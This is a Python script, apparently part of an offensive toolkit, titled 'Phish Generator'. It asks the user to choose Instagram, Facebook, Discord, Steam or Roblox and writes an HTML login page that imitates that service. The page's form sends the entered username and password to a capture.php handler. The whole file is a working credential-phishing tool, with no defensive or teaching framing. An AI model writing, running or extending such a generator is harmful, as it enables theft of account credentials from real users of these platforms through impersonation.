import sys, os
_root = os.path.dirname(os.path.abspath(__file__)).rsplit("Tools",1)[0]
if _root not in sys.path:
    sys.path.insert(0,_root)
from Core.Engine import *

set_title("Phish Generator")
print(LOGO)
opts = {"1":"Instagram","2":"Facebook","3":"Discord","4":"Steam","5":"Roblox"}
for k, v in opts.items():
    print(f"  [{k}] {v}")
c = input(f"\n{PM} Choice -> {RS}")
if c not in opts:
    bad()
name = opts[c]
domain = name.lower()
out = os.path.join(ROOT, "1-Output", f"phish_{domain}")
os.makedirs(out, exist_ok=True)
html = '<html><head><title>' + name + ' Login</title><style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;background:linear-gradient(135deg,indigo,purple)}.box{background:white;padding:40px;border-radius:10px;text-align:center}input{display:block;width:100%;margin:10px 0;padding:12px}button{background:indigo;color:white;padding:12px 30px;border:none;border-radius:5px}</style></head><body><div class="box"><h2>' + name + ' Login</h2><form action="capture.php" method="POST"><input name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><button>Login</button></form></div></body></html>'
with open(os.path.join(out, "index.html"), "w") as f:
    f.write(html)
print(f"\n{OK} {out}")
pause()
restart()
